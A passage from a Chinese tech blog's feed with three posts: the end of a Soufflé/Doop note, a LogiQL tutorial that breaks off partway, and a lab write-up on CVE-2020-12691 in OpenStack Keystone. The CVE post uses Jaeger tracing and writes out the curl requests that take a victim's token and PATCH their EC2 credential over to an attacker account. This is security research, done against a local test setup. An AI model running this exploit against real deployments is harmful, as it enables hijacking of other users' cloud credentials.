href="https://www.researchgate.net/publication/221321022_Strictly_Declarative_Specification_of_Sophisticated_Points-to_Analyses">Strictly Declarative Specification of Sophisticated Points-to Analyses</a>，具体的指针分析实现可以参考 <a href="http://yanniss.github.io/points-to-tutorial15.pdf">Pointer Analysis</a>。</p><p>Doop 虽然很强大，但是学起来比较困难，而且我还没什么 Java 基础… 费劲。</p><h1 id="参阅"><a href="#参阅" class="headerlink" title="参阅"></a>参阅</h1><ul><li><a href="https://bitbucket.org/yanniss/doop/src/master/">doop</a></li><li><a href="https://souffle-lang.github.io/index.html">Soufflé | Soufflé • A Datalog Synthesis Tool for Static Analysis</a></li></ul>]]></content>
    
    
    <summary type="html">开源引擎 Soufflé 介绍及使用（根据 Doop 学习进度后续安排更新）</summary>
    
    
    
    <category term="Other" scheme="https://jckling.github.io/categories/Other/"/>
    
    
    <category term="Datalog" scheme="https://jckling.github.io/tags/Datalog/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2020-12691 漏洞利用相关信息追踪</title>
    <link href="https://jckling.github.io/2021/11/05/Jaeger/CVE-2020-12691%20%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E7%9B%B8%E5%85%B3%E4%BF%A1%E6%81%AF%E8%BF%BD%E8%B8%AA/"/>
    <id>https://jckling.github.io/2021/11/05/Jaeger/CVE-2020-12691%20%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E7%9B%B8%E5%85%B3%E4%BF%A1%E6%81%AF%E8%BF%BD%E8%B8%AA/</id>
    <published>2021-11-05T07:25:15.000Z</published>
    <updated>2021-11-23T14:04:58.773Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>5.14 的时候就写好了，就是一直没发（摊手</p><p>使用 Victoria 版本的 Keystone（<a href="https://tarballs.openstack.org/keystone/keystone-18.0.0.tar.gz">18.0.0</a>）不能复现漏洞利用，但是可以获取漏洞利用过程中所需的相关信息。</p><ul><li>该漏洞可以在 <a href="https://tarballs.openstack.org/keystone/keystone-16.0.0.tar.gz">Keystone 16.0.0</a> 上进行利用</li></ul><p>该漏洞的原理是使用受害者的 X-Subject-Token、credential，将其 credential 对应的 user_id、project_id 替换为攻击者的，攻击者因此获得了 credential 的使用权，进而使用该 credential 请求受害者所有的资源。漏洞利用所需的信息包括：</p><ul><li>user_id</li><li>project_id</li><li>credential</li><li>X-Subject-Token</li></ul><h1 id="相关概念"><a href="#相关概念" class="headerlink" title="相关概念"></a>相关概念</h1><h2 id="令牌（Token）"><a href="#令牌（Token）" class="headerlink" title="令牌（Token）"></a>令牌（Token）</h2><p>一旦用户的凭据（credential）通过验证，令牌服务验证和管理用于发起授权请求的令牌。</p><p>下图是请求 token 的时序图，<strong>在 v3 版本的 API 中，token 在 HTTP 头部的 X-Subject-Token 字段中，而且作为 HTTP 头部的 X-Auth-Token 字段，用以向其他服务提供认证。</strong></p><img src="https://i.loli.net/2021/11/05/PMkbSVJxoEDevWm.png" width="80%"><h2 id="应用程序凭据（Application-Credential）"><a href="#应用程序凭据（Application-Credential）" class="headerlink" title="应用程序凭据（Application Credential）"></a>应用程序凭据（Application Credential）</h2><p>用户可以创建应用凭据来允许其应用向 Keystone 进行认证，用户可以将其在项目上的角色分配的子集委托给应用程序凭据。应用使用凭据（而不是用户名密码）进行身份认证。</p><p>EC2 credential 允许用户通过 Amazon S3 API 访问 OpenStack 资源。</p><h1 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h1><p>使用 Virtualbox 虚拟机安装 Ubuntu 18.04；然后再安装 Docker 和 Jaeger 相关的 Python 库。</p><ol><li><p>安装 Docker</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Docker</span></span><br><span class="line">sudo apt update</span><br><span class="line"></span><br><span class="line">sudo apt install \</span><br><span class="line">    apt-transport-https \</span><br><span class="line">    ca-certificates \</span><br><span class="line">    curl \</span><br><span class="line">    gnupg \</span><br><span class="line">    lsb-release</span><br><span class="line"></span><br><span class="line">curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /usr/share/keyrings/docker-archive-keyring.gpg</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> \</span><br><span class="line">  <span class="string">&quot;deb [arch=amd64 signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] https://download.docker.com/linux/ubuntu \</span></span><br><span class="line"><span class="string">  <span class="subst">$(lsb_release -cs)</span> stable&quot;</span> | sudo tee /etc/apt/sources.list.d/docker.list &gt; /dev/null</span><br><span class="line"></span><br><span class="line">sudo apt update</span><br><span class="line">sudo apt install docker-ce docker-ce-cli containerd.io</span><br><span class="line"></span><br><span class="line">sudo usermod -aG docker <span class="variable">$USER</span></span><br><span class="line">newgrp docker</span><br><span class="line"></span><br><span class="line"><span class="comment"># 开机启动</span></span><br><span class="line">sudo systemctl <span class="built_in">enable</span> docker.service</span><br><span class="line">sudo systemctl <span class="built_in">enable</span> containerd.service</span><br></pre></td></tr></table></figure></li><li><p>安装 Docker Compose（虽然没用到xd）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># docker-compose</span></span><br><span class="line">sudo curl -L <span class="string">&quot;https://github.com/docker/compose/releases/download/1.28.6/docker-compose-<span class="subst">$(uname -s)</span>-<span class="subst">$(uname -m)</span>&quot;</span> -o /usr/<span class="built_in">local</span>/bin/docker-compose</span><br><span class="line">sudo chmod +x /usr/<span class="built_in">local</span>/bin/docker-compose</span><br><span class="line">docker-compose --version</span><br></pre></td></tr></table></figure></li><li><p>使用 pip 安装 Jaeger 相关的库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Python 库</span></span><br><span class="line">pip install jaeger_client</span><br><span class="line">pip install opentracing</span><br></pre></td></tr></table></figure></li><li><p>启动 all-in-one 镜像</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 拉取镜像</span></span><br><span class="line">docker pull jaegertracing/all-in-one</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建容器</span></span><br><span class="line">docker run -itd -p 6831:6831/udp -p 6832:6832/udp -p 16686:16686 jaegertracing/all-in-one</span><br></pre></td></tr></table></figure></li></ol><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>使用 admin 用户执行以下指令，创建受害者（user1）和攻击者（user2）用户，并绑定角色和项目，最后各自生成一个 EC2 credential 。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 列出角色</span></span><br><span class="line">openstack role list</span><br><span class="line"><span class="comment"># 创建角色</span></span><br><span class="line">openstack role create myrole</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建项目及用户</span></span><br><span class="line">openstack project create --description <span class="string">&#x27;cve-2020-12691&#x27;</span> project1 --domain default</span><br><span class="line">openstack user create --project project1 --password password user1</span><br><span class="line">openstack project create --description <span class="string">&#x27;cve-2020-12691&#x27;</span> project2 --domain default</span><br><span class="line">openstack user create --project project2 --password password user2</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置用户角色</span></span><br><span class="line">openstack role add --user user1 --project project1 admin</span><br><span class="line">openstack role add --user user2 --project project2 myrole</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看角色分配</span></span><br><span class="line">openstack role assignment list</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建 credential</span></span><br><span class="line">openstack ec2 credentials create --project project1 --user user1 --user-domain default --project-domain default</span><br><span class="line">openstack ec2 credentials create --project project2 --user user2 --user-domain default --project-domain default</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看 credential</span></span><br><span class="line">openstack credential list</span><br></pre></td></tr></table></figure><p>对 Keystone 进行<strong>插桩</strong>，追踪 <code>openstack credential list</code> 的执行链路。发现包含漏洞利用所需的所有信息，但对应的 X-Subject-Token 是 admin 用户的。</p><p>改用属于 admin 角色的 user1 用户执行该指令，admin 角色的用户可以查看所有 credential：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> OS_USERNAME=user1</span><br><span class="line"><span class="built_in">export</span> OS_PASSWORD=password</span><br><span class="line"><span class="built_in">export</span> OS_PROJECT_NAME=project1</span><br><span class="line"><span class="built_in">export</span> OS_USER_DOMAIN_NAME=Default</span><br><span class="line"><span class="built_in">export</span> OS_PROJECT_DOMAIN_NAME=Default</span><br><span class="line"><span class="built_in">export</span> OS_AUTH_URL=http://127.0.0.1:5000/v3</span><br><span class="line"><span class="built_in">export</span> OS_IDENTITY_API_VERSION=3</span><br><span class="line"></span><br><span class="line">openstack credential list</span><br></pre></td></tr></table></figure><p>（user1）除了 X-Subject-Token ，还包含 user_id、project_id</p><img src="https://i.loli.net/2021/11/05/e5yNWCf3OkQvLBJ.png" width="95%"><p>（user1）另一条 trace 中包含 credential ，根据 user_id 和 project_id ，可以辨认出 user1 用户的 credential</p><img src="https://i.loli.net/2021/11/05/aypQeJtBGnWDIhd.png" width="95%"><p>（user2）赋予 myrole 角色的 user2 只能看到自己的 credential 信息</p><img src="https://i.loli.net/2021/11/05/Uogye3GNDs9YkZb.jpg" width="95%"><p>（user2）追踪信息和 user1 用户的相同，包括自己的 X-Subject-Token、user_id、project_id</p><img src="https://i.loli.net/2021/11/05/o6hbXtQHZegaN83.png"><p>以下是漏洞利用的过程：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 获取 User1 的 X-Subject-Token</span></span><br><span class="line">curl -i -s\</span><br><span class="line">  -H <span class="string">&quot;Content-Type: application/json&quot;</span> \</span><br><span class="line">  -d <span class="string">&#x27;</span></span><br><span class="line"><span class="string">&#123; &quot;auth&quot;: &#123;</span></span><br><span class="line"><span class="string">    &quot;identity&quot;: &#123;</span></span><br><span class="line"><span class="string">      &quot;methods&quot;: [&quot;password&quot;],</span></span><br><span class="line"><span class="string">      &quot;password&quot;: &#123;</span></span><br><span class="line"><span class="string">        &quot;user&quot;: &#123;</span></span><br><span class="line"><span class="string">          &quot;name&quot;: &quot;user1&quot;,</span></span><br><span class="line"><span class="string">          &quot;domain&quot;: &#123; &quot;name&quot;: &quot;default&quot; &#125;,</span></span><br><span class="line"><span class="string">          &quot;password&quot;: &quot;password&quot;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">      &#125;</span></span><br><span class="line"><span class="string">    &#125;,</span></span><br><span class="line"><span class="string">    &quot;scope&quot;: &#123;</span></span><br><span class="line"><span class="string">      &quot;project&quot;: &#123;</span></span><br><span class="line"><span class="string">        &quot;name&quot;: &quot;project1&quot;,</span></span><br><span class="line"><span class="string">        &quot;domain&quot;: &#123; &quot;name&quot;: &quot;default&quot; &#125;</span></span><br><span class="line"><span class="string">      &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">&#125;&#x27;</span> \</span><br><span class="line">  <span class="string">&quot;http://localhost:5000/v3/auth/tokens?nocatalog&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取 User1 的 credential（根据 user_id 和 peoject_id 查找）</span></span><br><span class="line">curl \</span><br><span class="line">  -H <span class="string">&quot;Content-Type: application/json&quot;</span> \</span><br><span class="line">  -H <span class="string">&quot;X-Auth-Token: gAAAAABgdRYFHdUj407-Ysq_SSPjsB5NXYDmjtFx6WCKcbgh7QBSIJSxa0s4b7RDs0fxO3eB5GW6X1vD9o1PSUQn-nKX2KzJRQHKhWHlDBWM8xjCWsZmfEMd7dOM0VyUXb5P8H4H4CKCqoCZcwQw-eibA_u6NWuNHG8kAR-AQR2OyDSKMF9X9Yg&quot;</span> \</span><br><span class="line">  <span class="string">&quot;http://localhost:5000/v3/credentials&quot;</span> | python -m json.tool</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 替换为 User2 的 user_id、project_id</span></span><br><span class="line">curl -X PATCH \</span><br><span class="line">  -H <span class="string">&quot;Content-Type: application/json&quot;</span> \</span><br><span class="line">  -H <span class="string">&quot;X-Auth-Token: gAAAAABgdRYFHdUj407-Ysq_SSPjsB5NXYDmjtFx6WCKcbgh7QBSIJSxa0s4b7RDs0fxO3eB5GW6X1vD9o1PSUQn-nKX2KzJRQHKhWHlDBWM8xjCWsZmfEMd7dOM0VyUXb5P8H4H4CKCqoCZcwQw-eibA_u6NWuNHG8kAR-AQR2OyDSKMF9X9Yg&quot;</span> \</span><br><span class="line">  -d <span class="string">&#x27;</span></span><br><span class="line"><span class="string">&#123; &quot;credential&quot;: &#123;</span></span><br><span class="line"><span class="string">    &quot;project_id&quot;: &quot;b0419aebd03c40f3b8b0c413d19056ce&quot;,</span></span><br><span class="line"><span class="string">    &quot;user_id&quot;: &quot;6d173c8b8d354c0b8f890a0666821a64&quot;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">&#125;&#x27;</span> \</span><br><span class="line">  <span class="string">&quot;http://localhost:5000/v3/credentials/416f331f7a26867c8be1fe3c574b4878b09b58fd272b7ab60bb568b52deabdb9&quot;</span></span><br></pre></td></tr></table></figure><p>也就是说，只要获得了受害者的 X-Subject-Token、credential ，就可以通过 PATCH 请求将 credential 对应的所有者替换为攻击者的。</p><h1 id="Jaeger-API"><a href="#Jaeger-API" class="headerlink" title="Jaeger API"></a>Jaeger API</h1><p>返回追踪信息，保存为 json 格式。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># http://jaeger-query:16686/api/traces/&#123;trace-id-hex-string&#125;</span></span><br><span class="line">curl <span class="string">&quot;http://localhost:16686/api/traces/a6192f3a980c57b5&quot;</span> -o 3.json</span><br><span class="line"></span><br><span class="line">cat 3.json | python -mjson.tool</span><br></pre></td></tr></table></figure><p>这里的 <code>trace-id-hex-string</code> 是路径中完整的字符串，不是 Jaeger UI 中的缩略显示。</p><img src="https://i.loli.net/2021/11/05/FpVlJZf72TtvEXi.png" width="80%"><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ol><li><p>从复现漏洞利用的角度来说，链路追踪可以获取到大量的可用信息，帮助构建漏洞利用脚本；</p></li><li><p>从发现漏洞的角度来说，通过链路追踪的到的数据进行分析，可能发现异常。</p><ul><li>上述漏洞可以通过使用同一个用户执行相同指令，对比发现返回的结果不同。具体来说就是漏洞利用之前和之后 <code>openstack credential list</code> 返回的数据不一致，因此可以推断这里可能产生了异常。</li></ul></li></ol><h1 id="参阅"><a href="#参阅" class="headerlink" title="参阅"></a>参阅</h1><ul><li><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-12691">CVE - CVE-2020-12691</a></li><li><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-12691">NVD - CVE-2020-12691</a></li><li><a href="https://docs.docker.com/engine/install/ubuntu/">Install Docker Engine on Ubuntu</a></li><li><a href="https://docs.docker.com/engine/install/linux-postinstall/">Post-installation steps for Linux</a></li><li><a href="https://docs.docker.com/compose/install/">Install Docker Compose</a></li><li><a href="https://www.jaegertracing.io/docs/1.22/getting-started/">Getting Started – Jaeger documentation</a></li></ul>]]></content>
    
    
    <summary type="html">使用 Jaeger 对 Keystone 进行追踪</summary>
    
    
    
    <category term="Jaeger" scheme="https://jckling.github.io/categories/Jaeger/"/>
    
    
    <category term="Python" scheme="https://jckling.github.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>LogiQL 入门</title>
    <link href="https://jckling.github.io/2021/10/26/Other/LogiQL%20%E5%85%A5%E9%97%A8/"/>
    <id>https://jckling.github.io/2021/10/26/Other/LogiQL%20%E5%85%A5%E9%97%A8/</id>
    <published>2021-10-26T08:15:05.000Z</published>
    <updated>2021-11-23T14:04:58.781Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>最近看的工具中用到了 <a href="https://bitbucket.org/yanniss/doop/src/master/">Doop</a>，这是一个以 <strong>指针分析</strong> 算法为中心的 Java 静态分析框架，使用 <a href="https://en.wikipedia.org/wiki/Datalog">Datalog</a> 规则形式表达的各种分析的集合。维护两套规则：</p><ul><li><a href="http://www.logicblox.com/">LogicBlox</a>：使用 LogiQL，Datalog 程序的构建块以 <strong>谓词</strong> 的形式出现，例如 <code>Person(&quot;John&quot;)</code>、<code>Parent(&quot;John&quot;, &quot;Johnny jr&quot;)</code>，利用 <strong>规则</strong>（IDB 逻辑）从已知的事实中推断出新的信息，例如 <code>Ancestor(x, y) &lt;- Parent(x, y)</code></li><li><a href="https://github.com/souffle-lang/souffle">souffle-lang/souffle</a> (Systematic, Ontological, Undiscovered Fact Finding Logic Engine)：由 Datalog 启发的一种编程语言，可用于静态分析、网络分析和数据分析。默认使用该引擎。</li></ul><p>没看到默认用的是开源的 souffle，结果花了一下午入门 LogiQL 还有找 3.10.x 版本的 LogicBlox …</p><p>LogicBlox 一直是闭源软件，目前最新版本 4.x.x 都可以下载，<a href="https://developer.logicblox.com/release-archive-310/">Release Archive (LB 3.10.x)</a> 不再提供下载，可以通过 <a href="https://developer.logicblox.com/logicblox-academic-license-request/">LogicBlox Academic License Request</a> 申请。找了好久没地方下载还要申请，回头仔细看了看 Doop 的说明文档才发现应该去看 souffle 😅😅😅</p><p>LogiQL 入门跟着教程 <a href="https://developer.logicblox.com/content/docs4/tutorial/repl/section/split.html">LogiQL in 30 minutes</a> 走就好了，介绍的特别简单，能够让人刚踩到门槛上吧（大概）。</p><h1 id="0x01-LogiQL-入门"><a href="#0x01-LogiQL-入门" class="headerlink" title="0x01 LogiQL 入门"></a>0x01 LogiQL 入门</h1><h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p>用在线的 <a href="https://repl.logicblox.com/">LogicBlox REPL (Read-Eval-Print Loop)</a> 进行实验，REPL 是一个基于命令的交互式环境，可以在其中执行 LogiQL 命令并立即检查结果。</p><h2 id="术语"><a href="#术语" class="headerlink" title="术语"></a>术语</h2><p>工作区（workspace）指代数据库（database），结合了模式（schema）、逻辑（logic）和数据（data）</p><h2 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h2><p>定义一个冰淇淋商店会计系统，记录以下信息：</p><ul><li>成本（人工，原料）：cost(labor, ingredients)</li><li>价格：price</li><li>销量/周：sales</li><li>每个冰淇淋的收入/周：revenue</li><li>所有冰淇淋的收入/周：week revenue</li><li>每个冰淇淋的收益/周：profit</li><li>所有冰淇淋的收益/周：week profit</li></ul><p>定义功能谓词（functional predicates）</p><ul><li>谓词类似 SQL 数据库中的表</li><li>除了最后一列之外的所有列都形成一个主键，最后一列表示值，因此一个主键最多可以关联一个值。</li></ul><h3 id="1-cost-谓词"><a href="#1-cost-谓词" class="headerlink" title="1. cost 谓词"></a>1. <code>cost</code> 谓词</h3><p>定义名为 cost 的谓词，键为 icecream，值为 c；指向右侧的箭头表示约束（constraint），icecream 的值必须是字符串、c 的值必须是整数</p><ul><li>约束表明如果箭头左侧为真，则右侧必须成立</li></ul><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cost[icecream] = c -&gt;</span><br><span class="line">   string(icecream), int(c).</span><br></pre></td></tr></table></figure><p>在 REPL 中执行需要使用相应的命令，<code>addblock</code> 接受一个参数，在引号之间添加的定义的 LogiQL 代码。</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">addblock <span class="string">&#x27;cost[icecream] = c -&gt;</span></span><br><span class="line"><span class="string">   string(icecream), int(c).&#x27;</span></span><br></pre></td></tr></table></figure><p>添加之后使用 <code>list</code> 命令列出谓词</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">list</span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2021/10/26/oAX6JHgMvx5BeTu.png" width="80%"><h3 id="2-事实（facts）"><a href="#2-事实（facts）" class="headerlink" title="2. 事实（facts）"></a>2. 事实（facts）</h3><p>谓词中的数据条目在 LogiQL 中称为事实（facts）。</p><p>LogiQL 支持 3 种增量更新操作</p><ul><li>插入（insert）：插入新事实，使用 <code>+</code> 前缀</li><li>删除（remove）：删除事实，使用 <code>-</code> 前缀 </li><li>更新（upsert）：添加或更新，使用 <code>^</code> 前缀，只能应用在功能谓词上</li></ul><p>使用 <code>exec</code> 执行一次性的命令，而 <code>addblock</code> 可以理解为“永久”地将谓词添加到工作区。</p><p>添加一个成本为 23 的冰淇淋：</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec <span class="string">&#x27;+cost[&quot;Popsicle Lemon&quot;] = 23.&#x27;</span></span><br></pre></td></tr></table></figure><p><code>print</code> 命令用于打印谓词。</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print cost</span><br></pre></td></tr></table></figure><p>添加冰淇淋（成本）：</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">exec <span class="string">&#x27;+cost[&quot;Fruit Sundae&quot;] = 120.</span></span><br><span class="line"><span class="string">+cost[&quot;Mango Sorbet&quot;] = 40.</span></span><br><span class="line"><span class="string">+cost[&quot;Cone Chocolate&quot;] = 50.</span></span><br><span class="line"><span class="string">+cost[&quot;Cone Vanilla&quot;] = 44.</span></span><br><span class="line"><span class="string">+cost[&quot;Cone Chili Fries&quot;] = 200.&#x27;</span></span><br></pre></td></tr></table></figure><p>更新冰淇淋的售价：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec &#39;^cost[&quot;Popsicle Lemon&quot;] &#x3D; 25.&#39;</span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2021/10/26/3XDQBGNLoMxwfv4.png"><h3 id="3-price-谓词、week-sales-谓词"><a href="#3-price-谓词、week-sales-谓词" class="headerlink" title="3. price 谓词、week_sales 谓词"></a>3. <code>price</code> 谓词、<code>week_sales</code> 谓词</h3><p>定义谓词 price 表示冰淇淋的售价，定义谓词 week_sales 表示每周的销售数量（可以把 week_sales 看作二维映射）。</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">addblock <span class="string">&#x27;price[icecream] = p -&gt;</span></span><br><span class="line"><span class="string">   string(icecream), int(p).</span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string">week_sales[icecream, week] = value -&gt;</span></span><br><span class="line"><span class="string">  string(icecream),</span></span><br><span class="line"><span class="string">  int(week),</span></span><br><span class="line"><span class="string">  int(value).&#x27;</span></span><br></pre></td></tr></table></figure><p>添加冰淇淋售价及其第 1、2 周的销量（往谓词中添加事实）：</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">exec <span class="string">&#x27;+price[&quot;Popsicle Lemon&quot;] = 50.</span></span><br><span class="line"><span class="string">+price[&quot;Fruit Sundae&quot;] = 200.</span></span><br><span class="line"><span class="string">+price[&quot;Mango Sorbet&quot;] = 70.</span></span><br><span class="line"><span class="string">+price[&quot;Cone Chocolate&quot;] = 80.</span></span><br><span class="line"><span class="string">+price[&quot;Cone Vanilla&quot;] = 70.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">+week_sales[&quot;Popsicle Lemon&quot;, 1] = 122.</span></span><br><span class="line"><span class="string">+week_sales[&quot;Fruit Sundae&quot;, 1] = 88.</span></span><br><span class="line"><span class="string">+week_sales[&quot;Mango Sorbet&quot;, 1] = 72.</span></span><br><span class="line"><span class="string">+week_sales[&quot;Cone Chocolate&quot;, 1] = 4.</span></span><br><span class="line"><span class="string">+week_sales[&quot;Cone Vanilla&quot;, 1] = 257.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">+week_sales[&quot;Popsicle Lemon&quot;, 2] = 112.</span></span><br><span class="line"><span class="string">+week_sales[&quot;Fruit Sundae&quot;, 2] = 60.</span></span><br><span class="line"><span class="string">+week_sales[&quot;Mango Sorbet&quot;, 2] = 44.</span></span><br><span class="line"><span class="string">+week_sales[&quot;Cone Chocolate&quot;, 2] = 9.</span></span><br><span class="line"><span class="string">+week_sales[&quot;Cone Vanilla&quot;, 2] = 200.&#x27;</span></span><br></pre></td></tr></table></figure><p>打印谓词：</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print price</span><br><span class="line">print week_sales</span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2021/10/26/vmKatAVFYOID2XH.png" width="90%"><h3 id="4-规则（rules）"><a href="#4-规则（rules）" class="headerlink" title="4. 规则（rules）"></a>4. 规则（rules）</h3><p>规则可用于推导新的事实，添加计算收入 <code>revenue</code> 的规则：</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">addblock <span class="string">&#x27;week_revenue[icecream, week] =</span></span><br><span class="line"><span class="string">  price[icecream] * week_sales[icecream, week].&#x27;</span></span><br></pre></td></tr></table></figure><p>打印规则，该规则会自动进行计算：</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print week_revenue</span><br></pre></td></tr></table></figure><p>修改一个价格，会自动进行重新计算：</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">exec <span class="string">&#x27;^price[&quot;Popsicle Lemon&quot;] = 70.&#x27;</span></span><br><span class="line"></span><br><span class="line">print week_revenue</span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2021/10/26/goQXUZ2zTp9JxYV.png" width="80%"><p>添加计算冰淇淋收益 <code>profit</code> 的规则、计算每周收益的规则 <code>week_profit</code>：</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 